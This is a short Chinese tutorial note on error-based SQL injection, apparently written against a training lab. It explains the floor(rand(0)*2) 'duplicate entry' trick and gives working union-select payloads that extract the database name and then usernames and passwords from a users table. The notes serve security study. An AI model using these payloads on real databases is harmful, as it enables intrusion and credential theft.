## 报错注入
相关函数：

1. rand() : 0~1随机小数
2. floor() : 向下取整
3. ceiling()
4. concat_ws() : 将括号内的数据用第一个字段连接起来 concatenate with separator
5. group by 分组语句
6. as 别名
7. count() :  count(column_name) 统计 column_name 中非 NULL 值的行，count(*) 则统计指定表中所有行的数量
8. limit 显示指定行数 limit 0,1 表示限制从第 0 项开始取 1 项



```sql
union select 1,count(*),concat_ws('-',(select database()), floor(rand(0)*2)) as a from information_schema.tables group by a
```

from information_schema.tables 为了有足够的列数

count(*) 用来统计个数

concat_ws() 用 - 将 select database() 的返回值和 floor(rand(0)*2) 的值连接起来

每一个 concat_ws(...) 都重命名为 a 并按照它进行分组，于是会出现两种键

database_name-0 和 database_name-1

该手法成功的关键在于：给它分组时算了一遍 rand , 计数时又要算一遍 rand , 就有可能出现重复定义键名的错误，从而产生报错 duplicate entry，返回我们想要看到的信息

但是，最后一步挂掉了：

```sql
union select 1,count(*),concat_ws('-',(
select group_concat(username,"-",password) from users
), floor(rand(0)*2)) as a from information_schema.tables group by a
```

页面只显示：You are in........    这是怎么回事呢？

太长了，它就不显示了

可以用 substring 解决

也可以用 concat 加上 limit 限制来解决

```sql
union select 1,count(*),concat_ws('-',(
select concat(username,"-",password) from users limit 0,1
), floor(rand(0)*2)) as a from information_schema.tables group by a
```

